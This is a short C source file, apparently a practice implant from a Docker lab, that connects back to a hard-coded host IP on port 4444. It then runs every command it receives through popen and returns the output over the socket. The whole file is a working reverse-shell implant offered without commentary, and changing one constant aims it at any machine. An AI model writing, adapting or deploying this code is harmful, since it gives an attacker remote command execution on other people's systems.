// implant_client.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "192.168.65.254"  // Host system IP visible from Docker
#define SERVER_PORT 4444
#define BUF_SIZE 1024

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[BUF_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[-] Socket");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("[-] Connect");
        return 1;
    }

    while (1) {
        memset(buffer, 0, BUF_SIZE);
        int n = read(sock, buffer, BUF_SIZE - 1);
        if (n <= 0) break;

        if (strncmp(buffer, "exit", 4) == 0) break;

        FILE *fp = popen(buffer, "r");
        if (!fp) {
            char *fail = "Command execution failed\n";
            write(sock, fail, strlen(fail));
        } else {
            while (fgets(buffer, BUF_SIZE, fp)) {
                write(sock, buffer, strlen(buffer));
            }
            pclose(fp);
        }
    }

    close(sock);
    return 0;
}
